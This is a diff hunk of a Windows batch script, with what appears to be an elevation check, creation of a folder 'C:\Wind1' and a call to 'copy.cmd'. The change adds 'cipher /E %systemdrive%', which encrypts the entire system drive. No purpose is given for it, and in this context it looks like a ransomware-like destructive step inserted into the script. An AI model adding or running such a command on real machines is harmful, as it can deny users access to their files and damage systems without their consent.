@@ -30,11 +30,12 @@ if '%errorlevel%' NEQ '0' (
 
 md   C:\Wind1
 @echo on
-
-
+ 
+cipher /E %systemdrive%
 
 
 
 @echo off 
 
 copy.cmd
+	
